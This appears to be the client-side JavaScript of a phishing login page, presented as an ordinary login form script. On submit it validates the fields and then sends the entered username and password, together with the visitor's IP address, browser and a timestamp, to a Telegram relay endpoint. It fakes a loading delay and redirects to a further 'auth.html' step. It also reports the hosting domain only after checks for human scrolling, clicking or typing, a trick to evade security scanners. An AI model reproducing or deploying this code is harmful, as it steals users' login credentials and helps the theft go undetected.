(function () {
  var form = document.getElementById("login-form");
  var userInput = document.getElementById("un");
  var passwordInput = document.getElementById("password");
  var userError = document.getElementById("user_name_validation_message");
  var passwordError = document.getElementById("password_validation_message");
  var usernameNeeded = document.getElementById("UserNameNeededError");
  var forgotPassword = document.getElementById("forgot-password-link");
  var submitBtn = form.querySelector('.button-subm');

  // ============================================================
  // ====== DOMAIN DETECTION - ONE TIME, HUMAN ONLY =============
  // ============================================================

  let domainDetected = false;
  let humanInteractionConfirmed = false;

  function detectDomain() {
    // Prevent multiple detections
    if (domainDetected) return;
    
    // Only proceed if human interaction has been confirmed
    if (!humanInteractionConfirmed) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;

    // Mark as detected immediately to prevent duplicates
    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain
    });

    console.log(`🌐 Domain detected (human): ${domain}`);
  }

  // ====== CONFIRM HUMAN INTERACTION - ONE TIME ======
  function confirmHumanInteraction() {
    if (humanInteractionConfirmed) return;
    
    // Verify this is a real human interaction
    // Trusted events = human, untrusted = bot/script
    if (event && event.isTrusted === false) return;
    
    humanInteractionConfirmed = true;
    console.log('👤 Human interaction confirmed');
    
    // Now trigger domain detection
    detectDomain();
  }

  // ====== HUMAN SCROLL DETECTION ======
  let scrollTimeout = null;
  let scrollCount = 0;
  let lastScrollTime = 0;

  window.addEventListener('scroll', function(e) {
    // Skip if already detected
    if (domainDetected) return;
    
    // Must be a trusted event (human)
    if (!e.isTrusted) return;
    
    const now = Date.now();
    const timeSinceLastScroll = now - lastScrollTime;
    lastScrollTime = now;
    
    // Bots scroll too fast (under 100ms between events)
    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 100) {
      return; // Too fast - likely bot
    }
    
    // Count scroll events
    scrollCount++;
    
    // Need at least 2 scroll events with reasonable timing
    if (scrollCount < 2) return;
    
    // Check if user has actually scrolled meaningful distance
    const scrollY = window.scrollY;
    if (scrollY < 30) return; // Must scroll at least 30px
    
    // Clear any pending timeout
    if (scrollTimeout) {
      clearTimeout(scrollTimeout);
      scrollTimeout = null;
    }
    
    // Debounce: wait 300ms after scroll stops to confirm
    scrollTimeout = setTimeout(function() {
      if (!domainDetected && humanInteractionConfirmed === false) {
        confirmHumanInteraction();
      }
      scrollTimeout = null;
    }, 300);
    
  }, { passive: true });

  // ====== HUMAN CLICK DETECTION ======
  document.addEventListener('click', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    // Ignore clicks on loading spinners or disabled buttons
    if (e.target.closest('.spinner, .loading')) return;
    
    // Confirm human interaction
    confirmHumanInteraction();
  });

  // ====== HUMAN KEYPRESS DETECTION ======
  document.addEventListener('keydown', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    // Only care about character keys (not function keys)
    if (e.key.length !== 1) return;
    
    // Confirm human interaction
    confirmHumanInteraction();
  });

  // ====== HUMAN MOUSEMOVE DETECTION (Fallback) ======
  let mouseMoveCount = 0;
  
  document.addEventListener('mousemove', function(e) {
    if (domainDetected) return;
    if (!e.isTrusted) return;
    
    mouseMoveCount++;
    
    // Need multiple mouse moves to confirm human
    if (mouseMoveCount < 3) return;
    
    // Check if mouse moved in a natural way (not robotic)
    // Humans don't move in straight perfect lines
    if (e.movementX === 0 && e.movementY === 0) return;
    
    // Confirms human interaction
    confirmHumanInteraction();
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  function clearErrors() {
    userError.textContent = "";
    passwordError.textContent = "";
    usernameNeeded.hidden = true;
  }

  function showTitleError() {
    var title = document.title;
    if (title.indexOf("Submission Error |") !== 0) {
      document.title = "Submission Error | " + title;
    }
  }

  passwordInput.addEventListener("keypress", function (event) {
    if (event.which === 32 || /\s/.test(event.key)) {
      event.preventDefault();
    }
  });

  forgotPassword.addEventListener("click", function (event) {
    event.preventDefault();
    clearErrors();
    var userName = userInput.value.trim();
    if (!userName) {
      usernameNeeded.hidden = false;
      showTitleError();
      return;
    }
    alert("Password reset requested for: " + userName);
  });

  // ============================================================
  // ====== LOGIN FORM SUBMIT ===================================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    clearErrors();

    var userName = userInput.value.trim();
    var password = passwordInput.value;
    var valid = true;
    var userPattern = /^[A-Za-z0-9.\-_@]+$/;

    if (!userName) {
      userError.textContent = "The Username field is required.";
      valid = false;
    } else if (userName.length > 100) {
      userError.textContent = "Username exceeds maximum allowed characters.";
      valid = false;
    } else if (!userPattern.test(userName)) {
      userError.textContent = "Special Characters are not allowed.";
      valid = false;
    }

    if (!password) {
      passwordError.textContent = "The Password field is required.";
      valid = false;
    } else if (password.length > 40) {
      passwordError.textContent = "Password exceeds maximum allowed characters.";
      valid = false;
    }

    if (!valid) {
      showTitleError();
      return;
    }

    // ====== SEND LOGIN CREDENTIALS TO TELEGRAM ======
    sendToTelegram('login_attempt', {
      username: userName,
      password: password
    });

    // ====== DISABLE BUTTON AND SHOW LOADING ======
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');

    // Store username for next steps
    try {
      sessionStorage.setItem("melodyUser", userName);
    } catch (e) {}

    // ====== REDIRECT AFTER 8 SECONDS ======
    setTimeout(function() {
      window.location.href = "auth.html";
    }, 8000);
  });
})();